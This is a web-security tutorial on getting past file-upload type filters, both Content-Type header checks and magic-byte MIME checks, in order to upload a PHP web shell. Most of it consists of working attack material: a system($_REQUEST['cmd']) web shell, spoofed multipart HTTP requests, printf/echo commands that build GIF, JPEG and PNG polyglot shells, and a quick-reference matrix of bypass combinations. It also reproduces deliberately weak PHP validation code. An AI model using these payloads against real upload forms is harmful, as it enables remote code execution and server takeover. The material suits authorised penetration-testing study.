## Type Filter Bypass

Type filters represent a meaningful step up from extension-only validation. Rather than trusting the filename, they inspect either the HTTP header the browser sends or the actual file content. Both can be bypassed, and most real-world applications implement one or both without combining them with strict extension checking, leaving a gap.

***

## Method 1: Content-Type Header Manipulation

When the application validates the `Content-Type` header sent in the multipart upload request, it is still trusting client-supplied data. The browser sets this header automatically based on the file extension when you pick a file through the dialog, but nothing prevents you from changing it after the fact in Burp. 
The vulnerable validation code reads:

```php
$type = $_FILES['uploadFile']['type'];   // This is the Content-Type header

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

`$_FILES['uploadFile']['type']` is the raw `Content-Type` value from the HTTP request, entirely attacker-controlled. The fix is one field change in Burp Intercept or Repeater:

```http
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="uploadFile"; filename="shell.php"
Content-Type: image/jpeg          <-- Change this from application/x-php

<?php system($_REQUEST['cmd']); ?>
------Boundary--
```

The application checks the `Content-Type` field, sees `image/jpeg`, and passes validation. The actual file content is PHP and executes when accessed. 

To fuzz which content types are accepted:

```bash
# Extract only image/* types from the full SecLists content-type list
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/web-all-content-types.txt
grep 'image/' web-all-content-types.txt > image-content-types.txt
# Results in ~45 types to test rather than 700+
```

***

## Method 2: Magic Bytes (MIME-Type) Manipulation

MIME-type validation using `mime_content_type()` is a stronger check because it reads the actual file content rather than trusting the header. The function inspects the first few bytes of the file, known as the [file signature or magic bytes](https://en.wikipedia.org/wiki/List_of_file_signatures), to determine the real file type independent of filename or header.

```php
// This reads the actual file content, not the header
$type = mime_content_type($_FILES['uploadFile']['tmp_name']);

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

The bypass is prepending the magic bytes of a legitimate image type to the PHP payload. The MIME check sees the signature bytes and identifies the file as an image. PHP then executes the file and ignores the non-PHP bytes at the start because `<?php` is the actual execution trigger.

**Magic bytes by file type:**

| Format | Magic Bytes (Hex) | ASCII Representation |
|--------|------------------|---------------------|
| GIF87a | `47 49 46 38 37 61` | `GIF87a` |
| GIF89a | `47 49 46 38 39 61` | `GIF89a` |
| JPEG | `FF D8 FF E0` | Non-printable |
| PNG | `89 50 4E 47 0D 0A 1A 0A` | Non-printable |
| PDF | `25 50 44 46` | `%PDF` |

GIF is the easiest to work with because its magic bytes are plain ASCII, requiring no binary encoding or hex manipulation.  Both `GIF87a` and `GIF89a` work, but `GIF8` alone is usually sufficient since it is the common prefix of both valid signatures. 

**Creating the polyglot payload:**

```bash
# GIF magic bytes (easiest, ASCII)
echo 'GIF89a<?php system($_REQUEST["cmd"]); ?>' > shell.php

# JPEG magic bytes (binary, use printf)
printf '\xFF\xD8\xFF\xE0<?php system($_REQUEST["cmd"]); ?>' > shell.php

# PNG magic bytes (binary)
printf '\x89PNG\r\n\x1a\n<?php system($_REQUEST["cmd"]); ?>' > shell.php
```

Verify the MIME type is being correctly spoofed before uploading:

```bash
file shell.php
# shell.php: GIF image data    <-- MIME check will pass
```

When the shell executes, the output starts with `GIF89a` as raw text before the PHP output begins. This is cosmetic and does not affect functionality. 
***

## Combining Both Bypasses

The most robust approach combines both manipulations simultaneously, which defeats applications that check either the header, the content, or both:

```http
------Boundary
Content-Disposition: form-data; name="uploadFile"; filename="shell.php"
Content-Type: image/gif

GIF89a<?php system($_REQUEST['cmd']); ?>
------Boundary--
```

This single payload handles:
- Content-Type header check: sees `image/gif` and passes
- MIME magic byte check: sees `GIF89a` signature and identifies as GIF image
- PHP execution: engine ignores `GIF89a` as non-PHP output and executes the `<?php` block

***

## Combining Type Bypass with Extension Bypass

When the application checks both file content and extension, you need to satisfy both simultaneously. The combination matrix:

```
Goal: Pass content check AND execute as PHP

Weak regex whitelist + MIME check:
  filename="shell.jpg.php"  +  GIF89a magic bytes
  → Passes regex (contains .jpg) + Passes MIME (GIF signature) + PHP executes

Strict whitelist + Content-Type check only:
  filename="shell.php"  +  Content-Type: image/jpeg
  → Passes Content-Type check if MIME not verified + PHP executes

Strict whitelist + MIME check:
  filename="shell.jpg.php"  +  GIF89a magic bytes
  → Passes strict whitelist (.jpg at implied end) + Passes MIME + PHP executes
```

The key insight is that type validation and extension validation are implemented independently in most applications. Each layer has its own check, and satisfying the check for one layer does not necessarily mean you have addressed the other. Systematically working through each combination of bypass techniques reveals which layers are present and which are absent.

***

## Quick Reference: Bypass by Validation Type

```
Content-Type header only:
  Change Content-Type to image/jpeg in Burp, keep PHP extension and content

MIME magic bytes only:
  Prepend GIF89a to PHP content, keep .php extension

Both Content-Type + MIME:
  Change Content-Type to image/gif + prepend GIF89a to content

Extension + Content-Type:
  Use double extension (shell.jpg.php) + change Content-Type to image/jpeg

Extension + MIME:
  Use double extension (shell.jpg.php) + prepend GIF89a to content

All three (extension + Content-Type + MIME):
  Double extension + image/gif Content-Type + GIF89a magic bytes
```
